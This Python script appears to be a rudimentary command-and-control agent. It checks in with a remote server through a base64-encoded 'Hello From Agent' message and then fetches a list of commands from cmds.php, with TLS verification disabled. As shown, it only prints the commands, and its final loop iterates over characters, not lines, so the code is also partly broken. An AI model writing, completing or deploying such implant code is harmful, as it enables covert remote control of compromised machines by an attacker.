import requests
import base64
import sys

id = sys.argv[1]
url = sys.argv[2]

message = "Hello From Agent " + id + " (Python)"
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

hello = requests.get(url + "/res.php?res=" + base64_message + "&id="+id, verify=False)


cmds = requests.get(url + "/cmds.php?id="+id, verify=False)
print(cmds.text)

for lines in cmds.text:
	print(lines)
